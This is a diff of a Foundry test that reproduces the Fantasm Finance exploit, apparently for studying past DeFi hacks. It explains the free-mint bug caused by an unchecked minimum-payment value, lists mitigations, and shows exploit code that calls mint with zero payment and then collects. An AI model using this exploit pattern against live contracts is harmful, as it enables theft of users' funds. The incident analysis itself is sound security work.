@@ -87,19 +87,20 @@ Principle: Unchecked payment amount for minted tokens.
     }
     
 ATTACK:
-0) Deploy a contract the performs the following actions:
+0) Deploy a contract the performed the following actions:
 1) The attacker minted XFTM with pool.mint{value: 0}(someFSM, 0) 
 2) Collected the XFTMs
 3) Swapped XFTMs to FTM
-4) Rinse from step 1.
+4) Back to step 1.
 
 This was possible because the _minFtmIn return of calcMint() (minimum amount of FTM in required) was not consumed by the mint() function:
     (uint256 _xftmOut, SHOULD BE HERE , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(_ftmIn, _fantasmIn);
 
-Essentially, minting tokens for free.
+Essentially, minting tokens for free. 
 
 MITIGATIONS:
-1) If token are minted in exchange of a counterpart, check that the counterpart is sucessfully given to the contract (applies for any type of token).
+1) If tokens are minted in exchange of a counterpart, check that the counterpart is sucessfully transferred to the contract (applies for any type of token).
+2) Also, avoid using variable names with such resemblance...
 
 */
 interface IFantasm {
@@ -130,7 +131,7 @@ contract Exploit_FantasmFinance is Test {
         
         fsm.approve(address(fantasmPool), type(uint256).max); 
         fantasmPool.mint{value: 0}(fsm.balanceOf(address(this)), 0); // Passing 0 as _minXftmOut, msg.value == 0; https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
-        cheat.roll(32972130); // One block before collection
+        cheat.roll(32972130); // Jump one block before collection
         fantasmPool.collect(); // Collect tx https://ftmscan.com/tx/0x956e760143d3a029ae44fa2b60e8a7613ed937374b7e473109e3193e466f523a
         console.log("After exploit: xFTM of Attacker = ", xFTM.balanceOf(address(this)));
     }
